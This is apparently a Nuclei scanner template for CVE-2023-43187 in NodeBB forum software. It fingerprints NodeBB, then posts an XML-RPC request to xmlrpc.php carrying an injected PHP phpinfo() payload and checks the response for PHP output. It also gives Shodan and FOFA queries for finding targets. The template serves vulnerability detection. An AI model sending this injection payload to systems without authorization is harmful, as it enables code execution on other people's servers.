flow: http(1) && http(2)
http:
- matchers:
  - dsl:
    - contains(to_lower(body), "nodebb")
    internal: true
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}'
- body: "<?xml version=\"1.0\"?>\n<methodCall>\n  <methodName>system.listMethods</methodName>\n\
    \  <params>\n    <param>\n      <value><?php phpinfo(); ?></value>\n    </param>\n\
    \  </params>\n</methodCall>\n"
  headers:
    Content-Type: text/xml
  matchers:
  - condition: or
    part: body
    type: word
    words:
    - <title>phpinfo()</title>
    - PHP Version
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/xmlrpc.php'
id: CVE-2023-43187
info:
  author: 0xParth
  classification:
    cpe: cpe:2.3:a:nodebb:nodebb:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-43187
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-91
    epss-percentile: 0.99558
    epss-score: 0.90105
  description: 'A remote code execution (RCE) vulnerability in the xmlrpc.php endpoint
    of NodeBB Inc NodeBB forum software prior to v1.18.6 allows attackers to execute
    arbitrary code via crafted XML-RPC requests.

    '
  impact: 'Unauthenticated attackers can inject arbitrary PHP code through crafted
    XML-RPC requests to the xmlrpc.php endpoint, potentially gaining full control
    over the NodeBB forum server and accessing user data.

    '
  metadata:
    fofa-query: title="nodebb"
    max-request: 2
    product: nodebb
    shodan-query: cpe:"cpe:2.3:a:nodebb:nodebb"
    vendor: nodebb
  name: NodeBB XML-RPC Request xmlrpc.php - XML Injection
  reference:
  - https://github.com/jagat-singh-chaudhary/CVE/blob/main/CVE-2023-43187
  - https://nvd.nist.gov/vuln/detail/CVE-2023-43187
  remediation: 'Update NodeBB to version 1.18.6 or later that properly validates and
    sanitizes XML-RPC input to prevent code injection attacks.

    '
  severity: critical
  tags: cve,cve2023,nodebb,rce,vuln
